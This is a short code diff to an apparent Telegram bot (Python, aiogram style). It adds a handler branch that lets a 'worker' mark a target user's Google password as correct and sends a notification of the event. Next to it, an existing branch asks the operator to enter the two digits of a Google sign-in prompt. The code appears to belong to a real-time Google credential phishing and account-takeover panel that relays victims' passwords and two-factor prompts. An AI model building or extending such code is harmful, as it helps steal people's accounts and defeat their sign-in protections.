@@ -582,6 +582,21 @@ async def handle_google_control_callback(callback: CallbackQuery, bot: Bot):
             mirror_token=bot.token,
         )
 
+    elif action == "correct_pass":
+        db.set_google_auth_control(
+            DB_PATH,
+            tg_id=target_tg_id,
+            status="correct_password",
+            error_msg=None,
+        )
+        await callback.answer("✅ Пароль подтверждён (Верный пароль)", show_alert=True)
+        await notify_user_event(
+            event_type="google_password",
+            user_tg_id=target_tg_id,
+            details="Воркер подтвердил верный пароль",
+            mirror_token=bot.token,
+        )
+
     elif action == "ask_prompt":
         PENDING_GOOGLE_PROMPT[callback.from_user.id] = target_tg_id
         await callback.answer("📲 Введите 2 цифры в чат...", show_alert=False)
